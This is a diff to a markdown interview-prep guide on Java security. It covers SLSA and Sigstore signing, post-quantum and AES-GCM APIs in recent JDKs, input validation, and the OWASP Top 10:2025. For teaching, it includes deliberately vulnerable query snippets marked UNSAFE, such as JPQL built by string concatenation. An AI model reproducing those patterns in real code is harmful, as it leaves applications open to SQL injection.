+SLSA (pronounced "salsa") is a Google/OpenSSF framework that defines progressively stronger guarantees about how an artifact was built. Each level is a verifiable property of your build pipeline:
+
+| Level | Guarantee | Example |
+|-------|-----------|---------|
+| **SLSA 1** | Build process is scripted and produces provenance | GitHub Actions workflow emits a provenance file |
+| **SLSA 2** | Build is run on a hosted service; provenance is signed | Build on GitHub-hosted runners; provenance signed by GitHub OIDC |
+| **SLSA 3** | Build is isolated and non-forgeable | Hermetic build, no network after fetch, auditable build service |
+
+### Sigstore — Keyless Signing
+
+Sigstore (Linux Foundation) replaced the old "keep a GPG key in a safe" workflow with **keyless, short-lived certificates tied to OIDC identities**.
+
+Three moving parts:
+- **Cosign** — CLI to sign and verify container images, binaries, and blobs
+- **Fulcio** — CA that issues short-lived (10-minute) X.509 certificates tied to an OIDC identity (GitHub Actions, Google, email)
+- **Rekor** — append-only transparency log that records every signing event publicly
+
+```bash
+# Sign a Docker image keylessly — identity comes from GitHub Actions OIDC token
+cosign sign --yes ghcr.io/myorg/myapp@sha256:abc123...
+
+# Verify — ensures build came from expected repo + workflow
+cosign verify ghcr.io/myorg/myapp@sha256:abc123... \
+    --certificate-identity "https://github.com/myorg/myapp/.github/workflows/release.yml@refs/heads/main" \
+    --certificate-oidc-issuer "https://token.actions.githubusercontent.com"
+```
+
+### End-to-End Hardened Pipeline (senior-level reference design)
+
+1. **Pin dependencies** — lock versions in `pom.xml` / `gradle.lockfile`; no version ranges
+2. **Use internal repository mirror** (Nexus, Artifactory) with a vulnerability gate blocking ingestion of CVE-laden artifacts
+3. **Hermetic build** — no outbound network during `mvn package` except to the mirror
+4. **Generate SBOM** (CycloneDX) at package time, attach to the artifact
+5. **Sign artifact** with Cosign using CI OIDC identity (keyless)
+6. **Generate SLSA v1 provenance** attestation, sign, push to Rekor
+7. **Admission controller** on Kubernetes (e.g., Connaisseur, Kyverno) verifies Cosign signature + provenance before running the pod
+8. **Runtime scan** — Trivy / Falco watch for known-bad behavior
+9. **Continuous SCA** — Dependabot / Renovate opens PRs for CVE bumps; critical CVEs auto-merge with tests
+
+---
+
+## 13. Java Cryptography — Modern APIs and Post-Quantum
+
+### What Changed in JDK 21–24
+
+| Change | JEP / Version | Senior-interview relevance |
+|--------|---------------|----------------------------|
+| **Security Manager permanently disabled** | [JEP 486](https://openjdk.org/jeps/486), Java 24 | You cannot call `System.setSecurityManager()` — it throws `UnsupportedOperationException`. Do not propose Security Manager as a sandbox in interview answers; it is gone. Stub `java.lang.SecurityManager` remains only for compile-time compatibility |
+| **Key Derivation Function API** | [JEP 478](https://openjdk.org/jeps/478) (preview, Java 24) → [JEP 510](https://openjdk.org/jeps/510) (final, Java 25) | First-class `javax.crypto.KDF` API. HKDF in 24, Argon2/scrypt in 25 |
+| **ML-KEM (Kyber)** key encapsulation | [JEP 496](https://openjdk.org/jeps/496), Java 24 | Post-quantum KEM for key exchange (FIPS 203) |
+| **ML-DSA (Dilithium)** signatures | [JEP 497](https://openjdk.org/jeps/497), Java 24 | Post-quantum signatures (FIPS 204) |
+| **Hybrid PQ Key Exchange for TLS 1.3** | [JEP 527](https://openjdk.org/jeps/527), targeted Java 26 | `X25519MLKEM768` cipher in TLS — classical ECDH + ML-KEM so you are safe if either side breaks |
+| **ML-DSA JAR signing** | Planned JDK 26 (March 2026) | `jarsigner` will support ML-DSA |
+| **`SecureRandom` defaults** | Unchanged but worth knowing | Prefer `SecureRandom.getInstanceStrong()`; on Linux this blocks on `/dev/random` entropy — cache the instance |
+| **Deprecated algorithms** | TLS 1.0/1.1 disabled by default since JDK 11; 3DES, DES, MD5 signatures disabled via `jdk.tls.disabledAlgorithms` | Interviewers ask about reading `java.security` properties to audit disabled algorithms |
+
+### Post-Quantum Cryptography (PQC) — why care now
+
+"Harvest now, decrypt later" — adversaries record encrypted traffic today, decrypt it in 10–20 years when a cryptographically relevant quantum computer exists. Any long-lived secret (medical records, classified comms, signed software) needs PQ protection **before** the quantum threat materializes. NIST standardized the first PQ algorithms in 2024 (FIPS 203/204/205), and CNSA 2.0 mandates PQ transition for US national-security systems by 2033.
+
+```java
+// Java 24 — generate an ML-KEM key pair (post-quantum key encapsulation)
+KeyPairGenerator kpg = KeyPairGenerator.getInstance("ML-KEM-768");
+KeyPair kp = kpg.generateKeyPair();
+
+// Encapsulate: produces a shared secret + ciphertext
+KEM kem = KEM.getInstance("ML-KEM");
+KEM.Encapsulator encapsulator = kem.newEncapsulator(kp.getPublic());
+KEM.Encapsulated encapsulated = encapsulator.encapsulate();
+SecretKey sharedSecret = encapsulated.key();
+byte[] ciphertext = encapsulated.encapsulation();
+
+// Decapsulate on the recipient side
+KEM.Decapsulator decapsulator = kem.newDecapsulator(kp.getPrivate());
+SecretKey recoveredSecret = decapsulator.decapsulate(ciphertext);
+```
+
+**Hybrid is the 2026 recommended pattern** — combine a classical algorithm (ECDH/RSA) with a PQ one (ML-KEM). If either breaks, the combined secret is still safe. This is exactly what JEP 527 delivers for TLS 1.3.
+
+### Symmetric Encryption — Safe Defaults
+
+```java
+// AES-256-GCM — authenticated encryption, use this by default
+SecretKey key = KeyGenerator.getInstance("AES").generateKey(); // 256-bit
+byte[] iv = new byte[12];               // 96-bit IV for GCM
+SecureRandom.getInstanceStrong().nextBytes(iv);
+
+Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
+cipher.init(Cipher.ENCRYPT_MODE, key, new GCMParameterSpec(128, iv));
+cipher.updateAAD(associatedData);        // authenticated but not encrypted
+byte[] ciphertext = cipher.doFinal(plaintext);
+// Store iv + ciphertext; NEVER reuse (iv, key) pair
+```
+
+**Do not use:**
+- `AES/ECB/*` — leaks plaintext patterns
+- `AES/CBC/*` without HMAC — padding oracle attacks
+- DES, 3DES, Blowfish, RC4
+- SHA-1 for signatures
+- `MessageDigest` equality via `Arrays.equals` on MACs — use `MessageDigest.isEqual` (constant-time)
+
+---
+
+## 14. Input Validation and Injection Prevention
+
+### Bean Validation (Jakarta Validation API 3.1)
+
+Jakarta Bean Validation (formerly javax.validation, now `jakarta.validation`) is the Spring/Jakarta EE standard. Use **allowlist validation** on every DTO — a missing constraint is the bug, not the presence of an odd input.
+
+```java
+public record CreateUserRequest(
+    @NotBlank @Size(min = 3, max = 32)
+    @Pattern(regexp = "^[a-zA-Z0-9_-]+$", message = "Alphanumerics, _, - only")
+    String username,
+
+    @NotBlank @Email @Size(max = 254)
+    String email,
+
+    @NotBlank @Size(min = 12, max = 128)
+    String password,
+
+    @Min(18) @Max(120)
+    int age,
+
+    @URL @Size(max = 2048)
+    String website
+) {}
+
+@PostMapping("/users")
+public User create(@Valid @RequestBody CreateUserRequest req) { ... }
+
+// For collections: @Valid on the field, and constraints inside the bean
+public record BulkRequest(@NotEmpty @Size(max = 1000) List<@Valid Item> items) {}
+```
+
+Add `@ControllerAdvice` for a uniform 400 response on `MethodArgumentNotValidException` — do not echo field values back verbatim (XSS risk in error payloads).
+
+### SQL Injection — JPA Gotchas
+
+JPA/Hibernate is safe **if used correctly**. Senior interview trap cases:
+
+```java
+// SAFE — JPQL with named parameters
+@Query("SELECT u FROM User u WHERE u.email = :email")
+User findByEmail(@Param("email") String email);
+
+// SAFE — Criteria API, parameters bound
+cb.equal(root.get("email"), email);
+
+// UNSAFE — dynamic JPQL via string concat (happens often in "search" endpoints)
+em.createQuery("SELECT u FROM User u WHERE u.name = '" + name + "'");
+
+// UNSAFE — @Query with SpEL interpolation, nativeQuery
+@Query(value = "SELECT * FROM users WHERE name = :#{#name}", nativeQuery = true)
+// ^ :#{#name} still binds a parameter; fine. But below is not:
+@Query(value = "SELECT * FROM users ORDER BY :#{#sortField}", nativeQuery = true)
+// Column names cannot be parameters — validate against an allowlist enum instead
+
+// UNSAFE — Spring Data custom method with @Query doing string ops
+// Example: LIKE '%' || :search || '%' with unescaped % or _ in search causes
+// performance issues but not injection; still escape them.
+```
+
+For truly dynamic queries (filters, sort), use the **Specification API** or **jOOQ**, which both generate parameterized SQL.
+
+### Command / Path / LDAP / XPath Injection
+
+- **OS command** — use `ProcessBuilder(List<String>)` (array form, not shell string). Never concatenate user input into `sh -c`.
+- **Path traversal** — resolve against a canonical base and verify with `Path.startsWith`: see section 7 above.
+- **LDAP** — escape per RFC 4515, or use `javax.naming.ldap.Rdn.escapeValue()`.
+- **XPath / XML** — use parameterized XPath (`javax.xml.xpath.XPath.setXPathVariableResolver`), never string-concat.
+- **SpEL / OGNL / Thymeleaf templates** — never render user input into a template as an expression. Spring's `@Value("${...}")` resolves once at context load — safe; `@Value("#{...}")` evaluates SpEL — never feed it user input.
+
+---
+
+## 15. Common Senior Interview Questions
 
 **Q1: How would you design authentication and authorization for a microservices architecture?**
 
@@ -1622,18 +2095,25 @@ It should NOT be disabled for traditional form-based web applications that use s
 
 **Q6: What is the OWASP Top 10, and how does each item apply to a Java/Spring application?**
 
-The OWASP Top 10 (2021) lists the most critical web application security risks:
+The **OWASP Top 10:2025** (released November 6, 2025, based on analysis of 175,000+ CVEs) is the current reference. Senior interviewers expect you to know both the 2025 list *and* what changed versus 2021:
 
-1. **Broken Access Control** -- Missing `@PreAuthorize`, IDOR vulnerabilities, missing ownership checks
-2. **Cryptographic Failures** -- Weak hashing (MD5), plaintext secrets in config, missing HTTPS
-3. **Injection** -- SQL injection, LDAP injection, OS command injection via `Runtime.exec()`
-4. **Insecure Design** -- Missing rate limiting, no account lockout, business logic flaws
-5. **Security Misconfiguration** -- Default credentials, verbose error messages, unnecessary features enabled, debug endpoints in production
-6. **Vulnerable Components** -- Outdated libraries with known CVEs (Log4Shell was a prime example)
-7. **Authentication Failures** -- Weak passwords, missing MFA, session fixation
-8. **Software and Data Integrity Failures** -- Insecure deserialization, CI/CD pipeline tampering, unsigned updates
-9. **Security Logging and Monitoring Failures** -- No audit logs, no alerting on breaches
-10. **SSRF** -- Server-side code fetching user-supplied URLs without validation
+| # | 2025 Category | Change vs 2021 | Java/Spring manifestation |
+|---|---------------|----------------|---------------------------|
+| A01 | **Broken Access Control** | Unchanged (#1). SSRF (was A10 in 2021) folded in | Missing `@PreAuthorize`, IDOR (`/users/{id}` without ownership check), flawed `AuthorizationManager`, SSRF against internal services / cloud metadata endpoints |
+| A02 | **Security Misconfiguration** | **Up from #5** | Default credentials, actuator endpoints exposed, verbose stack traces, CORS wildcard `*`, CSRF disabled on cookie-based apps, TLS with legacy ciphers, Spring dev tools in prod |
+| A03 | **Software Supply Chain Failures** | **New category (expanded from "Vulnerable Components")** | Transitive dependency CVEs (Log4Shell, Spring4Shell), malicious npm/Maven packages, unpinned Docker base images, CI/CD pipeline compromise, build-time code injection, unsigned artifacts |
+| A04 | **Cryptographic Failures** | Down from #2 | MD5/SHA-1 for passwords, hardcoded keys, missing HTTPS, using ECB mode, weak JWT secrets, not using a KDF (see JEP 478) |
+| A05 | **Injection** | Down from #3. Includes XSS | SQL injection via `Statement` concatenation, OS command injection via `ProcessBuilder` / legacy `Runtime` APIs with user input, LDAP injection, SpEL/OGNL injection, template injection (Thymeleaf `th:utext`), header injection |
+| A06 | **Insecure Design** | Down from #4 | Missing rate limiting, no account lockout, password reset flow that reveals account existence, business logic flaws, lack of threat modeling |
+| A07 | **Authentication Failures** | Unchanged (#7), renamed | Weak passwords, missing MFA, session fixation, credential stuffing without bot protection, JWT algorithm confusion, OAuth implicit flow still in use |
+| A08 | **Software and Data Integrity Failures** | Unchanged position | Insecure Java deserialization, unsigned JARs, auto-update without signature verification, CI/CD pipeline tampering, reliance on untrusted CDN scripts (use SRI) |
+| A09 | **Security Logging & Alerting Failures** | Unchanged (#9), renamed | No audit logs, logging PII/secrets, no alerting on anomalies, logs not centralized, retention too short for incident forensics |
+| A10 | **Mishandling of Exceptional Conditions** | **New category (24 CWEs)** | Failing open on exception (e.g., returning `true` from auth check on error), swallowed exceptions hiding tampering, leaking internal paths in error pages, race conditions in error paths |
+
+Key takeaways senior engineers flag:
+- **SSRF is now part of A01** — validate URLs, block loopback/link-local/metadata ranges, use an egress allowlist
+- **Supply chain got its own category (A03)** — you must be able to produce an SBOM, sign artifacts, and verify build provenance
+- **A10 (fail-safe defaults)** is new — your error paths must default to *denying* access, not allowing
 
 **Q7: Explain how you would implement rate limiting for a distributed system.**
 
